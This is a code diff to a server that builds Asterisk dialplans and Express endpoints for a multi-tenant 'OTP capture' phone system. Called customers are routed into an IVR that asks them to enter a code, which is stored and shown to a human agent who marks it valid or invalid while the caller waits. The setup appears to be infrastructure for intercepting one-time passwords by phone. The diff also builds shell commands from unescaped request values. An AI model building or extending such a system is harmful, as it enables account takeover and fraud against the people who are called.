@@ -2297,20 +2297,22 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Answer()\n`;
   dialplanContent += ` same => n,Wait(1.5)\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
-  dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${TRANSFERERNAME})})\n`;
+  dialplanContent += ` same => n,Set(AGENT_CHAN=\${IF($["\${BLINDTRANSFER}" != ""]?\${BLINDTRANSFER}:\${IF($["\${TRANSFERERNAME}" != ""]?\${TRANSFERERNAME}:\${ATTENDEDTRANSFER})})})\n`;
   dialplanContent += ` same => n,Set(AGENT_CUT=\${CUT(CUT(AGENT_CHAN,-,1),/,2)})\n`;
-  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_CUT}" != ""]?\${AGENT_CUT}:\${IF($["\${DB(last_picked_agent/\${TARGET_DEST})}" != ""]?\${DB(last_picked_agent/\${TARGET_DEST})}:\${IF($["\${DB(last_agent_call/\${TARGET_DEST})}" != ""]?\${DB(last_agent_call/\${TARGET_DEST})}:\${IF($["\${LAST_AGENT}" != "" & "\${LAST_AGENT}" != "ringall" & "\${LAST_AGENT}" != "all"]?\${LAST_AGENT}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:\${DB(last_agent_call/\${EXTEN})})})})})})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_picked_agent/\${TARGET_DEST})}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_picked_agent/\${CALLERID(num)})}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = "" || "\${FINAL_AGENT}" = "ringall"]?Set(FINAL_AGENT=1001))\n`;
+  dialplanContent += ` same => n,Set(CHAN_EP=\${IF($["\${CHANNEL(channeltype)}" = "PJSIP"]?\${CHANNEL(endpoint)}:\${CUT(CUT(CHANNEL,-,1),/,2)})})\n`;
+  dialplanContent += ` same => n,Set(IS_CHAN_AGENT=\${REGEX("^[0-9]{3,5}$" \${CHAN_EP})})\n`;
+  dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${AGENT_CUT}" != "" & "\${AGENT_CUT}" != "ringall" & "\${AGENT_CUT}" != "all"]?\${AGENT_CUT}:\${IF($["\${IS_CHAN_AGENT}" = "1"]?\${CHAN_EP}:\${IF($["\${CALLING_AGENT}" != "" & "\${CALLING_AGENT}" != "ringall" & "\${CALLING_AGENT}" != "all"]?\${CALLING_AGENT}:\${IF($["\${IVR_AGENT_EXTEN}" != "" & "\${IVR_AGENT_EXTEN}" != "ringall" & "\${IVR_AGENT_EXTEN}" != "all"]?\${IVR_AGENT_EXTEN}:\${IF($["\${DB(last_picked_agent/\${TARGET_DEST})}" != ""]?\${DB(last_picked_agent/\${TARGET_DEST})}:\${IF($["\${DB(last_agent_call/\${TARGET_DEST})}" != ""]?\${DB(last_agent_call/\${TARGET_DEST})}:\${LAST_AGENT})})})})})})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = "" || "\${FINAL_AGENT}" = "ringall" || "\${FINAL_AGENT}" = "all"]?Set(FINAL_AGENT=\${DB(last_picked_agent/\${CALLERID(num)})}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = "" || "\${FINAL_AGENT}" = "ringall" || "\${FINAL_AGENT}" = "all"]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = "" || "\${FINAL_AGENT}" = "ringall" || "\${FINAL_AGENT}" = "all"]?Set(FINAL_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = "" || "\${FINAL_AGENT}" = "ringall" || "\${FINAL_AGENT}" = "all"]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = "" || "\${FINAL_AGENT}" = "ringall" || "\${FINAL_AGENT}" = "all"]?Set(FINAL_AGENT=1001))\n`;
   dialplanContent += ` same => n,Set(__FINAL_AGENT=\${FINAL_AGENT})\n`;
-  dialplanContent += ` same => n,Set(DB(last_agent_call/\${EXTEN})=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(__CALLING_AGENT=\${FINAL_AGENT})\n`;
+  dialplanContent += ` same => n,Set(__IVR_AGENT_EXTEN=\${FINAL_AGENT})\n`;
   dialplanContent += ` same => n,Set(DB(last_agent_call/\${TARGET_DEST})=\${FINAL_AGENT})\n`;
   dialplanContent += ` same => n,Set(DB(last_picked_agent/\${TARGET_DEST})=\${FINAL_AGENT})\n`;
-  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA \${EXTEN}] Destino: \${TARGET_DEST} | Cliente CID: \${CALLERID(num)} -> Retornara al Asesor: \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` same => n,NoOp(=== [TRANSFERENCIA \${EXTEN}] Destino: \${TARGET_DEST} | CanalEP: \${CHAN_EP} | Cliente CID: \${CALLERID(num)} -> Asesor Exacto: \${FINAL_AGENT} ===)\n`;
   dialplanContent += ` same => n,Set(__OTP_ENGINE_EXTEN=\${EXTEN})\n`;
   dialplanContent += ` same => n,Goto(ivr-captura-vivo,s,1)\n\n`;
 
@@ -2558,16 +2560,18 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Wait(1.5)\n`;
   dialplanContent += ` same => n,Set(CURR_EXT=\${IF($["\${OTP_ENGINE_EXTEN}" != ""]?\${OTP_ENGINE_EXTEN}:4001)})\n`;
   dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})})\n`;
-  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${IVR_AGENT_EXTEN}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${CALLING_AGENT}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${LAST_AGENT}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_picked_agent/\${TARGET_DEST})}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_picked_agent/\${CALLERID(num)})}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CURR_EXT})}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
-  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
+  dialplanContent += ` same => n,Set(CHAN_EP_VIVO=\${IF($["\${CHANNEL(channeltype)}" = "PJSIP"]?\${CHANNEL(endpoint)}:\${CUT(CUT(CHANNEL,-,1),/,2)})})\n`;
+  dialplanContent += ` same => n,Set(IS_CHAN_VIVO_AGENT=\${REGEX("^[0-9]{3,5}$" \${CHAN_EP_VIVO})})\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = "" | "\${FINAL_AGENT}" = "ringall" | "\${FINAL_AGENT}" = "all"]?Set(FINAL_AGENT=\${IF($["\${IS_CHAN_VIVO_AGENT}" = "1"]?\${CHAN_EP_VIVO}:)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = "" | "\${FINAL_AGENT}" = "ringall" | "\${FINAL_AGENT}" = "all"]?Set(FINAL_AGENT=\${IVR_AGENT_EXTEN}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = "" | "\${FINAL_AGENT}" = "ringall" | "\${FINAL_AGENT}" = "all"]?Set(FINAL_AGENT=\${CALLING_AGENT}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = "" | "\${FINAL_AGENT}" = "ringall" | "\${FINAL_AGENT}" = "all"]?Set(FINAL_AGENT=\${LAST_AGENT}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = "" | "\${FINAL_AGENT}" = "ringall" | "\${FINAL_AGENT}" = "all"]?Set(FINAL_AGENT=\${DB(last_picked_agent/\${TARGET_DEST})}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = "" | "\${FINAL_AGENT}" = "ringall" | "\${FINAL_AGENT}" = "all"]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = "" | "\${FINAL_AGENT}" = "ringall" | "\${FINAL_AGENT}" = "all"]?Set(FINAL_AGENT=\${DB(last_picked_agent/\${CALLERID(num)})}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = "" | "\${FINAL_AGENT}" = "ringall" | "\${FINAL_AGENT}" = "all"]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = "" | "\${FINAL_AGENT}" = "ringall" | "\${FINAL_AGENT}" = "all"]?Set(FINAL_AGENT=\${DB(ivr_vars/global_agent_exten)}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = "" | "\${FINAL_AGENT}" = "ringall" | "\${FINAL_AGENT}" = "all"]?Set(FINAL_AGENT=1001))\n`;
   dialplanContent += ` same => n,NoOp(=== [CAPTURA-DINAMICA-\${CURR_EXT}] Cliente: \${TARGET_DEST} | Retornara al Asesor: \${FINAL_AGENT} ===)\n`;
 
   // Resolucion dinamica de audios para esta extension concreta
@@ -2609,26 +2613,18 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Hangup()\n\n`;
 
   dialplanContent += ` ; Digitos capturados con exito por el cliente\n`;
-  dialplanContent += ` same => n(evaluar_codigo),NoOp(=== [CAPTURA-\${CURR_EXT}] CODIGO DIGITADO: \${USER_DIGITS} -> NOTIFICANDO AL ASESOR ===)\n`;
+  dialplanContent += ` same => n(evaluar_codigo),NoOp(=== [CAPTURA-\${CURR_EXT}] CODIGO DIGITADO: \${USER_DIGITS} -> NOTIFICANDO AL ASESOR \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_agent/\${TARGET_DEST})=\${FINAL_AGENT})\n`;
   dialplanContent += ` same => n,Set(DB(otp_codes/\${TARGET_DEST})=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(otp_captures/\${TARGET_DEST})=\${USER_DIGITS})\n`;
   dialplanContent += ` same => n,Set(DB(captured_otp/\${TARGET_DEST})=\${USER_DIGITS})\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST}_\${FINAL_AGENT})=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
-  dialplanContent += ` same => n,Set(DB(otp_codes/\${CALLERID(num)})=\${USER_DIGITS})\n`;
-  dialplanContent += ` same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})\n`;
-  dialplanContent += ` same => n,Set(DB(captured_otp/\${CALLERID(num)})=\${USER_DIGITS})\n`;
-  dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
-  dialplanContent += ` same => n,Set(DB(otp_codes/\${CURR_EXT})=\${USER_DIGITS})\n`;
-  dialplanContent += ` same => n,Set(DB(otp_captures/\${CURR_EXT})=\${USER_DIGITS})\n`;
-  dialplanContent += ` same => n,Set(DB(captured_otp/\${CURR_EXT})=\${USER_DIGITS})\n`;
-  dialplanContent += ` same => n,Set(DB(otp_status/\${CURR_EXT})=pending)\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CALLERID(num)}" != "\${TARGET_DEST}"]?Set(DB(otp_agent/\${CALLERID(num)})=\${FINAL_AGENT}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CALLERID(num)}" != "\${TARGET_DEST}"]?Set(DB(otp_codes/\${CALLERID(num)})=\${USER_DIGITS}))\n`;
+  dialplanContent += ` same => n,ExecIf($["\${CALLERID(num)}" != "\${TARGET_DEST}"]?Set(DB(otp_status/\${CALLERID(num)})=pending))\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
-  dialplanContent += ` same => n,Set(DB(otp_last_capture)=\${USER_DIGITS})\n`;
-  dialplanContent += ` same => n,Set(DB(captured_otp/last)=\${USER_DIGITS})\n`;
-  dialplanContent += ` same => n,Set(DB(captured_otp/global)=\${USER_DIGITS})\n`;
-  dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
-  dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
-  dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending,Extension=\${CURR_EXT})\n`;
+  dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending,Extension=\${CURR_EXT},Agent=\${FINAL_AGENT})\n`;
   dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&callerid=\${CALLERID(num)}&otp=\${USER_DIGITS}&agent=\${FINAL_AGENT}&exten=\${CURR_EXT}&channel=\${CHANNEL}&status=pending" &)\n`;
 
   dialplanContent += ` ; Reproducir audio de espera 'Un momento por favor, estamos validando...'\n`;
@@ -2637,19 +2633,15 @@ export function generateCleanDialplanConf(
   dialplanContent += ` same => n,Wait(1)\n`;
 
   dialplanContent += ` ; Bucle esperando aprobacion o rechazo del asesor en la interfaz web\n`;
-  dialplanContent += ` same => n,NoOp(=== [CAPTURA-\${CURR_EXT}] ESPERANDO DECISION DEL ASESOR (VALIDO O INVALIDO) ===)\n`;
+  dialplanContent += ` same => n,NoOp(=== [CAPTURA-\${CURR_EXT}] ESPERANDO DECISION DEL ASESOR \${FINAL_AGENT} (VALIDO O INVALIDO) ===)\n`;
   dialplanContent += ` same => n,Set(WAIT_LOOP=0)\n`;
   dialplanContent += ` same => n(bucle_espera_decision),Set(WAIT_LOOP=$[\${WAIT_LOOP} + 1])\n`;
-  dialplanContent += ` same => n,Set(RAW_STATUS=\${DB(otp_status/\${TARGET_DEST})})\n`;
+  dialplanContent += ` same => n,Set(RAW_STATUS=\${DB(otp_status/\${TARGET_DEST}_\${FINAL_AGENT})})\n`;
+  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${TARGET_DEST})}))\n`;
   dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${CALLERID(num)})}))\n`;
   dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${USER_DIGITS})}))\n`;
-  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/\${CURR_EXT})}))\n`;
-  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/last)}))\n`;
-  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_status/global)}))\n`;
-  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_last_status)}))\n`;
-  dialplanContent += ` same => n,ExecIf($[$["\${RAW_STATUS}" = ""] | $["\${RAW_STATUS}" = "pending"]]?Set(RAW_STATUS=\${DB(otp_decision)}))\n`;
   dialplanContent += ` same => n,Set(CURRENT_STATUS=\${TOLOWER(\${FILTER(abcdefghijklmnopqrstuvwxyz,\${RAW_STATUS})})})\n`;
-  dialplanContent += ` same => n,NoOp(=== [CAPTURA-\${CURR_EXT}] Ciclo \${WAIT_LOOP}/60 - Estado: \${CURRENT_STATUS} (Dest: \${TARGET_DEST}, Code: \${USER_DIGITS}) ===)\n`;
+  dialplanContent += ` same => n,NoOp(=== [CAPTURA-\${CURR_EXT}] Ciclo \${WAIT_LOOP}/60 - Estado: \${CURRENT_STATUS} (Dest: \${TARGET_DEST}, Agente: \${FINAL_AGENT}, Code: \${USER_DIGITS}) ===)\n`;
 
   dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "valid"]?codigo_aprobado)\n`;
   dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "invalid"]?codigo_rechazado)\n`;
@@ -2662,14 +2654,10 @@ export function generateCleanDialplanConf(
 
   dialplanContent += ` ; RAMA APROBADO: Asesor marco VALIDO en la web -> Reproduce locucion de exito y reconecta con el asesor\n`;
   dialplanContent += ` same => n(codigo_aprobado),NoOp(=== [CAPTURA-\${CURR_EXT}] TOKEN APROBADO: RECONECTANDO CON ASESOR \${FINAL_AGENT} ===)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST}_\${FINAL_AGENT})=done)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=done)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=done)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=done)\n`;
-  dialplanContent += ` same => n,Set(DB(otp_status/\${CURR_EXT})=done)\n`;
-  dialplanContent += ` same => n,Set(DB(otp_status/last)=done)\n`;
-  dialplanContent += ` same => n,Set(DB(otp_status/global)=done)\n`;
-  dialplanContent += ` same => n,Set(DB(otp_last_status)=done)\n`;
-  dialplanContent += ` same => n,Set(DB(otp_decision)=done)\n`;
   dialplanContent += ` same => n,Playback(\${AUDIO_SUCCESS})\n`;
   dialplanContent += ` same => n,Wait(0.5)\n`;
   dialplanContent += ` same => n,Set(JITTERBUFFER(adaptive)=default)\n`;
@@ -2678,14 +2666,10 @@ export function generateCleanDialplanConf(
 
   dialplanContent += ` ; RAMA RECHAZADO: Asesor marco INVALIDO en la web -> Reproduce locucion de error y reintenta pedir codigo\n`;
   dialplanContent += ` same => n(codigo_rechazado),NoOp(=== [CAPTURA-\${CURR_EXT}] TOKEN INVALIDO -> REINTENTANDO ===)\n`;
+  dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST}_\${FINAL_AGENT})=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
   dialplanContent += ` same => n,Set(DB(otp_status/\${USER_DIGITS})=pending)\n`;
-  dialplanContent += ` same => n,Set(DB(otp_status/\${CURR_EXT})=pending)\n`;
-  dialplanContent += ` same => n,Set(DB(otp_status/last)=pending)\n`;
-  dialplanContent += ` same => n,Set(DB(otp_status/global)=pending)\n`;
-  dialplanContent += ` same => n,Set(DB(otp_last_status)=pending)\n`;
-  dialplanContent += ` same => n,Set(DB(otp_decision)=pending)\n`;
   dialplanContent += ` same => n,Playback(\${AUDIO_FAILURE})\n`;
   dialplanContent += ` same => n,Goto(pedir_codigo)\n\n`;
 
@@ -6360,12 +6344,28 @@ let isSyncingAstDb = false;
 // Endpoint to receive OTP captures from Asterisk curl (GET or POST) or AMI
 app.all('/api/asterisk/otp/capture', (req, res) => {
   const number = req.body?.number || req.query?.number;
+  const callerid = req.body?.callerid || req.query?.callerid;
   const otp = req.body?.otp || req.query?.otp;
   const channel = req.body?.channel || req.query?.channel;
-  const service = req.body?.service || req.query?.service || 'Servicio al Cliente';
+  const exten = req.body?.exten || req.query?.exten;
+  const service = req.body?.service || req.query?.service || (exten ? `Captura OTP (Ext. ${exten})` : 'Servicio al Cliente');
   const status = req.body?.status || req.query?.status || 'pending';
-  const agent = req.body?.agent || req.query?.agent;
+  let agent = req.body?.agent || req.query?.agent;
   let tenantId = req.body?.tenantId || req.query?.tenantId;
+
+  // Fallback: si el canal es PJSIP de una extensión interna (ej. PJSIP/1002-000001), extraer la extensión real
+  if ((!agent || agent === 'ringall' || agent === 'all') && channel) {
+    const chanMatch = String(channel).match(/^PJSIP\/([0-9]{3,5})-/i);
+    if (chanMatch) {
+      agent = chanMatch[1];
+    }
+  }
+  if ((!agent || agent === 'ringall' || agent === 'all') && callerid && /^[0-9]{3,5}$/.test(String(callerid).trim())) {
+    const cidTrim = String(callerid).trim();
+    if (!/^4\d{3}$/.test(cidTrim) && !['3333', '7777', '6666', '5555', '4444', '8888'].includes(cidTrim)) {
+      agent = cidTrim;
+    }
+  }
 
   // Auto-resolve tenantId if not provided: match agent extension with tenant ranges
   if (!tenantId && agent) {
@@ -6386,14 +6386,20 @@ app.all('/api/asterisk/otp/capture', (req, res) => {
     const cleanAgent = (agent && agent !== 'ringall' && agent !== 'all') ? String(agent).trim() : undefined;
     const cleanTenantId = tenantId ? String(tenantId).trim() : undefined;
 
-    // Bring or create to the very top (index 0)
-    const existingIndex = capturedOtpHistory.findIndex((r) => r.number === cleanNumber && r.otp === cleanOtp);
+    // Bring or create to the very top (index 0), keeping separate records per agent
+    const existingIndex = capturedOtpHistory.findIndex(
+      (r) =>
+        r.number === cleanNumber &&
+        r.otp === cleanOtp &&
+        (!cleanAgent || !r.agent || r.agent === cleanAgent)
+    );
     let record: CapturedOtpItem;
     if (existingIndex >= 0) {
       record = capturedOtpHistory.splice(existingIndex, 1)[0];
       record.timestamp = new Date().toLocaleTimeString();
       record.status = cleanStatus;
       record.channel = channel ? String(channel) : record.channel;
+      if (service) record.service = String(service);
       if (cleanAgent) record.agent = cleanAgent;
       if (cleanTenantId) record.tenantId = cleanTenantId;
     } else {
@@ -6403,7 +6409,7 @@ app.all('/api/asterisk/otp/capture', (req, res) => {
         otp: cleanOtp,
         timestamp: new Date().toLocaleTimeString(),
         createdAt: Date.now(),
-        channel: channel ? String(channel) : 'PJSIP',
+        channel: channel ? String(channel) : (exten ? `Ext. ${exten}` : 'PJSIP'),
         service: service ? String(service) : 'Servicio al Cliente',
         status: cleanStatus,
         agent: cleanAgent,
@@ -6420,6 +6426,8 @@ app.all('/api/asterisk/otp/capture', (req, res) => {
     executeAsteriskCommand(`database put otp_codes "${cleanNumber}" "${cleanOtp}"`).catch(() => {});
     executeAsteriskCommand(`database put otp_status "${cleanNumber}" "${cleanStatus}"`).catch(() => {});
     if (record.agent) {
+      executeAsteriskCommand(`database put otp_agent "${cleanNumber}" "${record.agent}"`).catch(() => {});
+      executeAsteriskCommand(`database put otp_status "${cleanNumber}_${record.agent}" "${cleanStatus}"`).catch(() => {});
       executeAsteriskCommand(`database put last_picked_agent "${cleanNumber}" "${record.agent}"`).catch(() => {});
       executeAsteriskCommand(`database put last_agent_call "${cleanNumber}" "${record.agent}"`).catch(() => {});
     }
@@ -6471,7 +6479,9 @@ app.post('/api/asterisk/otp/decision', async (req, res) => {
       await executeAsteriskCommand(`database put otp_status "${cleanNum}" "${status}"`);
       await executeAsteriskCommand(`database put otp_status "${clean10}" "${status}"`);
       await executeAsteriskCommand(`database put otp_status "1${clean10}" "${status}"`);
-      await executeAsteriskCommand(`database put otp_decision "${status}"`);
+      if (returnAgent) {
+        await executeAsteriskCommand(`database put otp_status "${cleanNum}_${returnAgent}" "${status}"`);
+      }
 
       // If approved, ensure Asterisk knows the exact extension to return the call to!
       if (status === 'valid' && returnAgent) {
@@ -6511,9 +6521,21 @@ app.get('/api/asterisk/otp/records', async (req, res) => {
   const forceFresh = req.query.fresh === '1' || req.query.fresh === 'true';
   const shouldClear = req.query.clear === '1' || req.query.clear === 'true';
   const queryTenantId = req.query.tenantId ? String(req.query.tenantId).trim() : undefined;
+  const queryExtensionsRaw = req.query.extensions ? String(req.query.extensions).trim() : '';
+  const allowedExts = queryExtensionsRaw
+    ? queryExtensionsRaw.split(',').map((s) => s.trim()).filter(Boolean)
+    : [];
 
   if (shouldClear) {
-    if (queryTenantId && queryTenantId !== 'all') {
+    if (allowedExts.length > 0) {
+      capturedOtpHistory = capturedOtpHistory.filter(
+        (r) => !r.agent || !allowedExts.includes(String(r.agent).trim())
+      );
+      for (const ext of allowedExts) {
+        executeAsteriskCommand(`database del otp_codes "${ext}"`).catch(() => {});
+        executeAsteriskCommand(`database del otp_status "${ext}"`).catch(() => {});
+      }
+    } else if (queryTenantId && queryTenantId !== 'all') {
       capturedOtpHistory = capturedOtpHistory.filter((r) => r.tenantId !== queryTenantId);
     } else {
       capturedOtpHistory = [];
@@ -6521,6 +6543,7 @@ app.get('/api/asterisk/otp/records', async (req, res) => {
       try {
         await executeAsteriskCommand('database deltree otp_codes');
         await executeAsteriskCommand('database deltree otp_status');
+        await executeAsteriskCommand('database deltree otp_agent');
         await executeAsteriskCommand('database deltree captured_otp');
         await executeAsteriskCommand('database deltree otp_captures');
         await executeAsteriskCommand('database deltree otp_decision');
@@ -6532,10 +6555,18 @@ app.get('/api/asterisk/otp/records', async (req, res) => {
 
   const now = Date.now();
 
-  // Return real-time memory records filtered by tenant (if assigned)
-  const filteredRecords = (queryTenantId && queryTenantId !== 'all')
+  // Return real-time memory records filtered by tenant and/or assigned extensions
+  let filteredRecords = (queryTenantId && queryTenantId !== 'all')
     ? capturedOtpHistory.filter((r) => r.tenantId === queryTenantId)
     : capturedOtpHistory;
+
+  if (allowedExts.length > 0) {
+    filteredRecords = filteredRecords.filter((r) => {
+      const recAgent = r.agent ? String(r.agent).trim() : '';
+      if (recAgent) return allowedExts.includes(recAgent);
+      return allowedExts.includes(String(r.number).trim());
+    });
+  }
 
   res.json({ success: true, records: filteredRecords, totalAllTenants: capturedOtpHistory.length });
 
@@ -6546,6 +6577,8 @@ app.get('/api/asterisk/otp/records', async (req, res) => {
       try {
         const codesOutput = await executeAsteriskCommand('database show otp_codes');
         const statusOutput = await executeAsteriskCommand('database show otp_status');
+        const agentOutput = await executeAsteriskCommand('database show otp_agent');
+        const pickedOutput = await executeAsteriskCommand('database show last_picked_agent');
 
         const statusMap: Record<string, 'valid' | 'invalid' | 'pending'> = {};
         if (statusOutput) {
@@ -6563,6 +6596,22 @@ app.get('/api/asterisk/otp/records', async (req, res) => {
           }
         }
 
+        const agentMap: Record<string, string> = {};
+        for (const srcOut of [pickedOutput, agentOutput]) {
+          if (!srcOut) continue;
+          for (const line of srcOut.split('\n')) {
+            const clean = line.replace(/^Output:\s*/, '').trim();
+            const m = clean.match(/^\/(?:otp_agent|last_picked_agent)\/([^\s:]+)\s*:\s*([0-9]{3,5})/);
+            if (m) {
+              agentMap[m[1].trim()] = m[2].trim();
+            }
+          }
+        }
+
+        const storedTenants = loadStoredTenants();
+        const isEngineExt = (n: string) =>
+          /^4\d{3}$/.test(n) || ['333', '3333', '444', '4444', '555', '5555', '666', '6666', '777', '7777', '8888'].includes(n);
+
         if (codesOutput) {
           const lines = codesOutput.split('\n');
           for (const line of lines) {
@@ -6570,24 +6619,47 @@ app.get('/api/asterisk/otp/records', async (req, res) => {
             const match = cleanLine.match(/^\/otp_codes\/([^\s:]+)\s*:\s*([0-9*#]+)/);
             if (match) {
               const num = match[1].trim();
+              if (isEngineExt(num)) continue; // Ignore shared IVR engine extension keys (4001, 7777, etc.)
               const code = match[2].trim();
-              const currentStatus = statusMap[num] || 'pending';
-              const existingIndex = capturedOtpHistory.findIndex((r) => r.number === num && r.otp === code);
+              const resolvedAgent =
+                agentMap[num] ||
+                callStatusStore.get(num)?.agent ||
+                (/^[0-9]{3,5}$/.test(num) ? num : undefined);
+              const cleanResolvedAgent =
+                resolvedAgent && resolvedAgent !== 'ringall' && resolvedAgent !== 'all' ? resolvedAgent : undefined;
+              const statusKey = cleanResolvedAgent ? `${num}_${cleanResolvedAgent}` : num;
